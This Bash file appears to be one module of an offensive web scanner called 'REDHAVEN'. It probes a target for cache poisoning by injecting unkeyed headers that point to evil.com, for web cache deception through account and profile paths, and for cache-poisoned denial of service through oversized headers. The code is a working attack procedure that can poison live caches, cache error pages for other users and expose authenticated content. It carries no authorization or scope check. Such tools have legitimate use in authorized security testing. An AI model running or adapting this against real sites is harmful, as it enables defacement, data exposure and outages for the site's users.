#!/bin/bash
# REDHAVEN Module — Sourced by scanner.sh
# Do not run directly

# === CACHE POISONING ===
# 38. CACHE POISONING v2 (Unkeyed Headers + WCD + CPDoS)
run_cache_poisoning() {
    if check_dependency "$OUT_DIR/vulns/cache_poisoning.txt" "Cache Poisoning"; then return; fi
    log_phase "CACHE POISONING v2 (UNKEYED HEADERS + WCD + CPDoS)"
    
    mkdir -p "$OUT_DIR/.temp" "$OUT_DIR/vulns"
    : > "$OUT_DIR/vulns/cache_poisoning.txt"
    local finding_count=0
    
    local base_url="https://$TARGET"
    
    # ── STEP 1: DETECT CACHING BEHAVIOR ──
    log_step "Detecting caching behavior..."
    
    local cb="redhaven$(date +%s)"
    local headers=$(curl -sI --max-time 10 "${base_url}/?cb=${cb}" 2>/dev/null || echo "")
    
    local has_cache=false
    if echo "$headers" | grep -qiE "x-cache|cf-cache|x-varnish|x-cache-hit|age:|x-cdn|via:.*cloudfront|x-proxy-cache"; then
        has_cache=true
        local cache_header=$(echo "$headers" | grep -iE "x-cache|cf-cache|x-varnish|x-cache-hit|age:|x-cdn|via:|x-proxy-cache" | head -1 | tr -d '\r')
        log_success "Cache detected: $cache_header"
        echo "[INFO] Cache infrastructure detected: $cache_header" >> "$OUT_DIR/vulns/cache_poisoning.txt"
    else
        log_warn "No obvious cache headers detected. Testing anyway..."
    fi
    
    # ── STEP 2: UNKEYED HEADER INJECTION ──
    log_step "Testing unkeyed header injection for cache poisoning..."
    
    local poison_headers=(
        "X-Forwarded-Host:evil.com"
        "X-Forwarded-Scheme:http"
        "X-Original-URL:/evil"
        "X-Rewrite-URL:/evil"
        "X-Forwarded-Port:4443"
        "X-Forwarded-Proto:http"
        "X-Host:evil.com"
        "X-Forwarded-Server:evil.com"
    )
    
    for header_val in "${poison_headers[@]}"; do
        local header_name=$(echo "$header_val" | cut -d: -f1)
        local header_value=$(echo "$header_val" | cut -d: -f2-)
        local cb="cb$(date +%s%N | tail -c 8)"
        
        # First request: inject the unkeyed header with cache buster
        local resp1=$(curl -sL --max-time 10 \
            -H "${header_name}: ${header_value}" \
            -o "$OUT_DIR/.temp/cache_poison_resp.tmp" \
            -w "%{http_code}" \
            "${base_url}/?cachebust=${cb}" 2>/dev/null || echo "000")
        
        local body1=$(cat "$OUT_DIR/.temp/cache_poison_resp.tmp" 2>/dev/null || echo "")
        
        # Check if our injected value is reflected in the response
        if echo "$body1" | grep -qi "$header_value"; then
            echo "[HIGH] UNKEYED HEADER REFLECTED: $header_name" >> "$OUT_DIR/vulns/cache_poisoning.txt"
            echo "  → Injected: ${header_name}: ${header_value}" >> "$OUT_DIR/vulns/cache_poisoning.txt"
            echo "  → Value reflected in response body — cache poisoning possible" >> "$OUT_DIR/vulns/cache_poisoning.txt"
            finding_count=$((finding_count + 1))
            
            # Second request: check if the poisoned response is cached
            sleep 1
            local resp2=$(curl -sL --max-time 10 \
                -o "$OUT_DIR/.temp/cache_verify.tmp" \
                "${base_url}/?cachebust=${cb}" 2>/dev/null || echo "")
            
            local body2=$(cat "$OUT_DIR/.temp/cache_verify.tmp" 2>/dev/null || echo "")
            
            if echo "$body2" | grep -qi "$header_value"; then
                echo "[CRITICAL] CACHE POISONED! Header: ${header_name}" >> "$OUT_DIR/vulns/cache_poisoning.txt"
                echo "  → Poisoned response served to clean request (no injection header)" >> "$OUT_DIR/vulns/cache_poisoning.txt"
                echo "  → This is a confirmed cache poisoning vulnerability" >> "$OUT_DIR/vulns/cache_poisoning.txt"
                finding_count=$((finding_count + 1))
            fi
        fi
    done
    
    # ── STEP 3: WEB CACHE DECEPTION (WCD) ──
    log_step "Testing Web Cache Deception..."
    
    local sensitive_paths=("/account" "/profile" "/me" "/user" "/dashboard" "/settings" "/api/me" "/api/user")
    
    for spath in "${sensitive_paths[@]}"; do
        local normal_resp=$(curl -s --max-time 10 -o "$OUT_DIR/.temp/wcd_normal.tmp" -w "%{http_code}" \
            "${base_url}${spath}" 2>/dev/null || echo "000")
        
        # Skip 404s
        [ "$normal_resp" = "404" ] || [ "$normal_resp" = "000" ] && continue
        
        local normal_size=$(wc -c < "$OUT_DIR/.temp/wcd_normal.tmp" 2>/dev/null || echo 0)
        [ "$normal_size" -lt 100 ] && continue
        
        # Append static extension to trick cache
        local wcd_extensions=("/random.css" "/logo.png" "/style.js" "/.css")
        
        for ext in "${wcd_extensions[@]}"; do
            local wcd_resp=$(curl -s --max-time 10 -o "$OUT_DIR/.temp/wcd_ext.tmp" -w "%{http_code}" \
                "${base_url}${spath}${ext}" 2>/dev/null || echo "000")
            
            local wcd_size=$(wc -c < "$OUT_DIR/.temp/wcd_ext.tmp" 2>/dev/null || echo 0)
            
            # If appending .css returns similar content to the original, WCD may work
            if [ "$wcd_resp" = "200" ] && [ "$wcd_size" -gt 100 ]; then
                local normal_hash=$(md5sum "$OUT_DIR/.temp/wcd_normal.tmp" 2>/dev/null | cut -d' ' -f1)
                local wcd_hash=$(md5sum "$OUT_DIR/.temp/wcd_ext.tmp" 2>/dev/null | cut -d' ' -f1)
                
                if [ "$normal_hash" = "$wcd_hash" ]; then
                    echo "[HIGH] WEB CACHE DECEPTION: ${base_url}${spath}${ext}" >> "$OUT_DIR/vulns/cache_poisoning.txt"
                    echo "  → ${spath}${ext} returns same content as ${spath}" >> "$OUT_DIR/vulns/cache_poisoning.txt"
                    echo "  → If cached, attacker can steal authenticated user's page content" >> "$OUT_DIR/vulns/cache_poisoning.txt"
                    finding_count=$((finding_count + 1))
                    break
                fi
            fi
        done
    done
    
    # ── STEP 4: CPDoS (Cache Poisoned Denial of Service) ──
    log_step "Testing CPDoS via oversized headers..."
    
    local oversized=$(python3 -c "print('A' * 8000)" 2>/dev/null || printf '%8000s' | tr ' ' 'A')
    local cb="cpd$(date +%s%N | tail -c 8)"
    
    local cpd_resp=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
        -H "X-Oversized: $oversized" \
        "${base_url}/?cachebust=${cb}" 2>/dev/null || echo "000")
    
    if [ "$cpd_resp" = "400" ] || [ "$cpd_resp" = "431" ]; then
        # Check if error is cached
        sleep 1
        local clean_resp=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
            "${base_url}/?cachebust=${cb}" 2>/dev/null || echo "000")
        
        if [ "$clean_resp" = "400" ] || [ "$clean_resp" = "431" ]; then
            echo "[HIGH] CPDoS: Error response cached after oversized header!" >> "$OUT_DIR/vulns/cache_poisoning.txt"
            echo "  → Oversized X-Oversized header → $cpd_resp, clean request → $clean_resp (cached error)" >> "$OUT_DIR/vulns/cache_poisoning.txt"
            finding_count=$((finding_count + 1))
        fi
    fi
    
    
    
    rm -f "$OUT_DIR/.temp/cache_poison_resp.tmp" "$OUT_DIR/.temp/cache_verify.tmp" "$OUT_DIR/.temp/wcd_normal.tmp" "$OUT_DIR/.temp/wcd_ext.tmp"
    
    log_stat "Cache Poisoning Findings" "$finding_count"
    log_success "Cache Poisoning Analysis v2 completed."
}
